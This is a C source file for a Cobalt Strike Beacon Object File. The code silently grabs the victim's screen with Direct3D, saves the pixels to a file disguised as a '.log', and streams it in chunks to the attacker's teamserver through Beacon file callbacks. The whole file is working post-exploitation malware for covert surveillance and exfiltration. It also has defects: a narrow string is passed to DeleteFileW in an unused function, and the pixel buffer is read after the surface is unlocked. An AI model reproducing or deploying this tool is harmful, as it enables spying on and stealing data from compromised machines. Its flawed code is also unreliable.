
#include "beacon.h"
#include "bofdef.h"

#pragma comment(lib, "d3d9.lib")

#define RELEASE(x) if (x) { x->lpVtbl->Release(x); x = NULL; }


void deleteFile(const char* fileName) {
    if (!KERNEL32$DeleteFileW(fileName)) {
        MSVCRT$printf("Failed to delete file: %s\n", fileName);
    } else {
        MSVCRT$printf("File deleted successfully: %s\n", fileName);
    }
}


// From Memfiles BOF https://github.com/Octoberfest7/MemFiles
void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, int fileSize)
{
    //Intializes random number generator to create fileId 
    time_t t;
    MSVCRT$srand((unsigned)MSVCRT$time(&t));
    int fileId = MSVCRT$rand();

    //8 bytes for fileId and fileSize
    int messageLength = downloadFileNameLength + 8;
    char* packedData = (char*)MSVCRT$calloc(messageLength + 1, sizeof(char));
 
    //pack on fileId as 4-byte int first
    packedData[0] = (fileId >> 24) & 0xFF;
    packedData[1] = (fileId >> 16) & 0xFF;
    packedData[2] = (fileId >> 8) & 0xFF;
    packedData[3] = fileId & 0xFF;

    //pack on fileSize as 4-byte int second
    packedData[4] = (fileSize >> 24) & 0xFF;
    packedData[5] = (fileSize >> 16) & 0xFF;
    packedData[6] = (fileSize >> 8) & 0xFF;
    packedData[7] = fileSize & 0xFF;

    int packedIndex = 8;

    //pack on the file name last
    for (int i = 0; i < downloadFileNameLength; i++) {
        packedData[packedIndex] = fileName[i];
        packedIndex++;
    }

    BeaconOutput(CALLBACK_FILE, packedData, messageLength);

	char* packedChunk;

    if (fileSize > (1024 * 900))
	{
		//Lets see how many times this constant goes into our file size, then add one (because if it doesn't go in at all, we still have one chunk)
		int numOfChunks = (fileSize / (1024 * 900)) + 1;
		int index = 0;
		int chunkSize = 1024 * 900;

		//Allocate memory for our chunks
		int chunkLength = 4 + chunkSize;
		packedChunk = (char*)MSVCRT$calloc(chunkLength + 1, sizeof(char));

		while(index < fileSize)
		{
			if (fileSize - index > chunkSize){//We have plenty of room, grab the chunk and move on
				
				/*First 4 are the fileId 
				then account for length of file
				then a byte for the good-measure null byte to be included
				then lastly is the 4-byte int of the fileSize*/
	
				//pack on fileId as 4-byte int first
				packedChunk[0] = (fileId >> 24) & 0xFF;
				packedChunk[1] = (fileId >> 16) & 0xFF;
				packedChunk[2] = (fileId >> 8) & 0xFF;
				packedChunk[3] = fileId & 0xFF;

				int chunkIndex = 4;

				//pack on the file name last
				for (int i = index; i < index + chunkSize; i++) {
					packedChunk[chunkIndex] = returnData[i];
					chunkIndex++;
				}

				BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
			} 
			//This chunk is smaller than the chunkSize, so we have to be careful with our measurements
			else 
			{
				int lastChunkLength = fileSize - index + 4;

				//Reallocate memory for last chunk
				MSVCRT$free(packedChunk);
				packedChunk = (char*)MSVCRT$calloc(lastChunkLength + 1, sizeof(char));
					
				//pack on fileId as 4-byte int first
				packedChunk[0] = (fileId >> 24) & 0xFF;
				packedChunk[1] = (fileId >> 16) & 0xFF;
				packedChunk[2] = (fileId >> 8) & 0xFF;
				packedChunk[3] = fileId & 0xFF;
				int lastChunkIndex = 4;
					
				//pack on the file name last
				for (int i = index; i < fileSize; i++)
				{
					packedChunk[lastChunkIndex] = returnData[i];
					lastChunkIndex++;
				}
				BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, lastChunkLength);
			}
			index = index + chunkSize;
		}
        
	} 
	else 
	{
		/*first 4 are the fileId
		then account for length of file
		then a byte for the good-measure null byte to be included
		then lastly is the 4-byte int of the fileSize*/
		int chunkLength = 4 + fileSize;
		packedChunk = (char*)MSVCRT$calloc(chunkLength + 1, sizeof(char));
		
		//pack on fileId as 4-byte int first
		packedChunk[0] = (fileId >> 24) & 0xFF;
		packedChunk[1] = (fileId >> 16) & 0xFF;
		packedChunk[2] = (fileId >> 8) & 0xFF;
		packedChunk[3] = fileId & 0xFF;
		int chunkIndex = 4;

		//pack on the file name last
		for (int i = 0; i < fileSize; i++) {
			packedChunk[chunkIndex] = returnData[i];
			chunkIndex++;
		}

		BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
	}

	//Free memory
	MSVCRT$free(packedData);
	MSVCRT$free(packedChunk);

	//We need to tell the teamserver that we are done writing to this fileId
	char packedClose[4];

	//pack on fileId as 4-byte int first
	packedClose[0] = (fileId >> 24) & 0xFF;
	packedClose[1] = (fileId >> 16) & 0xFF;
	packedClose[2] = (fileId >> 8) & 0xFF;
	packedClose[3] = fileId & 0xFF;
	BeaconOutput(CALLBACK_FILE_CLOSE, packedClose, 4);
    return;
}

void SavePixelsToLogFile(int width, int height, int pitch, LPVOID pBits) {
    MSVCRT$printf("%doo%d.log\n", width, height);
    char fileName[256];
    MSVCRT$sprintf(fileName, "%doo%d.log", width, height);
    FILE* file = MSVCRT$fopen(fileName, "wb");
    if (file == NULL) {
        MSVCRT$printf("Failed to open file for writing: %s\n", fileName);
        return;
    }
    size_t bytesWritten = MSVCRT$fwrite(pBits, pitch * height, 1, file);
    if (bytesWritten != 1) {
        MSVCRT$printf("Failed to write pixel data to file: %s\n", fileName);
    }
    MSVCRT$fclose(file);

    downloadFile(fileName, MSVCRT$strlen(fileName), pBits, pitch * height);
    return;
}

// BOF entry function
int go() {

    HRESULT xx = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(xx)) return 0;
    UINT adapter = D3DADAPTER_DEFAULT;
    HRESULT hr = S_OK;
    IDirect3DDevice9 *pDevice = NULL;
    IDirect3DSurface9* surface = NULL;
    D3DPRESENT_PARAMETERS parameters = { 0 };
    D3DDISPLAYMODE mode;
    D3DLOCKED_RECT rc;
    UINT pitch;
    LPBYTE* shots = NULL;

    IDirect3D9 *d3d = D3D9$Direct3DCreate9(D3D_SDK_VERSION);
    hr = d3d->lpVtbl->GetAdapterDisplayMode(d3d, D3DADAPTER_DEFAULT, &mode);
    if (FAILED(hr)) {
        MSVCRT$printf("GetAdapterDisplayMode Failed\n");
        return 0;
    }
    MSVCRT$printf("Resolution: %dx%d\n", mode.Width, mode.Height);

    parameters.Windowed = TRUE;
    parameters.BackBufferCount = 1;
    parameters.BackBufferHeight = mode.Height;
    parameters.BackBufferWidth = mode.Width;
    parameters.SwapEffect = D3DSWAPEFFECT_DISCARD;
    parameters.hDeviceWindow = NULL;

    D3DDEVTYPE Hardware = D3DDEVTYPE_HAL;
    hr = d3d->lpVtbl->CreateDevice(d3d, adapter, Hardware , NULL, D3DCREATE_SOFTWARE_VERTEXPROCESSING, &parameters, &pDevice);
    if (FAILED(hr)) {
        return 1;
    }

    hr = pDevice->lpVtbl->CreateOffscreenPlainSurface(pDevice, mode.Width, mode.Height, D3DFMT_A8R8G8B8, D3DPOOL_SYSTEMMEM, &surface, NULL);
    if (FAILED(hr)) {
        MSVCRT$printf("CreateOffscreenPlainSurface Failed!\n");
        return 0;
    }
    hr = surface->lpVtbl->LockRect(surface, &rc, NULL, 0);
    if (FAILED(hr)) {
        MSVCRT$printf("LockRect Failed!\n");
        return 0;
    }
    pitch = rc.Pitch;
    hr = surface->lpVtbl->UnlockRect(surface);
    if (FAILED(hr)) {
        MSVCRT$printf("UnlockRect Failed!\n");
        return 0;
    }
    shots = (LPBYTE*)MSVCRT$malloc(1 * sizeof(LPBYTE));
    for (UINT i = 0; i < 1; i++) {
        shots[i] = (LPBYTE)MSVCRT$malloc(pitch * mode.Height);
    }

    for (UINT i = 0; i < 1; i++) {
        hr = pDevice->lpVtbl->GetFrontBufferData(pDevice, 0, surface);
        if (FAILED(hr)) {return 0;}
        hr = surface->lpVtbl->LockRect(surface, &rc, NULL, 0);
        if (FAILED(hr)) {return 0;}
        hr = surface->lpVtbl->UnlockRect(surface);
        if (FAILED(hr)) {return 0;}
    }
    SavePixelsToLogFile(mode.Width, mode.Height, pitch, rc.pBits); 
    
    if (shots != NULL) {
        for (UINT i = 0; i < 1; i++) {
            MSVCRT$free(shots[i]);
        }
        MSVCRT$free(shots);
    }
    RELEASE(surface);
    RELEASE(pDevice);
    RELEASE(d3d);
    OLE32$CoUninitialize();
    return 1;
}